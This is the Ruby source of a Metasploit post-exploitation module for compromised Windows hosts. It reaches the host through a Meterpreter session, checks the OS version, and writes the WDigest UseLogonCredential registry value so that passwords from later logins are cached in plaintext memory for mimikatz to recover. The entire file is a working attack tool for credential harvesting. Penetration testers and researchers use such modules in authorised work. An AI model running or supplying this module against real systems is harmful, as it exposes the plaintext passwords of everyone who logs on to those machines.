require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Accounts
  include Msf::Auxiliary::Report

  WDIGEST_REG_LOCATION = 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest'
  USE_LOGON_CREDENTIAL = 'UseLogonCredential'

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Windows Post Manage Enable WDigest Credential Caching',
      'Description'   => %q{
          On Windows 8/2012 or higher, the Digest Security Provider (WDIGEST) is disabled by default. This module enables
          credential caching by adding/changing the value of the UseLogonCredential DWORD under WDIGEST provider's Registry key.
          Any subsequest logins will allow mimikatz to recover the plain text passwords from the system's memory.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Kostas Lintovois <kostas.lintovois[at]mwrinfosecurity.com>'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
      ))
  end

  # Run Method for when run command is issued
  def run
    print_status("Running module against #{sysinfo['Computer']}")
    # Check if OS is 8/2012 or newer. If not, no need to set the registry key
    # Can be backported to Windows 7, 2k8R2 but defaults to enabled...
    if sysinfo['OS'] =~ /Windows (XP|Vista|200[03])/i
      print_status('Older Windows version detected. No need to enable the WDigest Security Provider. Exiting...')
    else
      wdigest_enable
    end
  end

  def wdigest_enable
    # Check if the key exists. Not present by default
    print_status("Checking if the #{WDIGEST_REG_LOCATION}\\#{USE_LOGON_CREDENTIAL} DWORD exists...")
    begin
      wdvalue = registry_getvaldata(WDIGEST_REG_LOCATION, USE_LOGON_CREDENTIAL)
      key_exists = !wdvalue.nil?

      print_status("#{USE_LOGON_CREDENTIAL} is set to #{wdvalue}") if key_exists

      # If it is not present, create it
      if key_exists && wdvalue == 1
        print_good('Registry value is already set. WDigest Security Provider is enabled')
      else
        verb = key_exists ? 'Setting' : 'Creating'
        print_status("#{verb} #{USE_LOGON_CREDENTIAL} DWORD value as 1...")
        if registry_setvaldata(WDIGEST_REG_LOCATION, USE_LOGON_CREDENTIAL, 1, 'REG_DWORD')
          print_good('WDigest Security Provider enabled')
        else
          print_error('Unable to access registry key - insufficient privileges?')
        end
      end
    rescue Rex::Post::Meterpreter::RequestError => e
      fail_with(Failure::Unknown, "Unable to access registry key: #{e}")
    end
  end
end
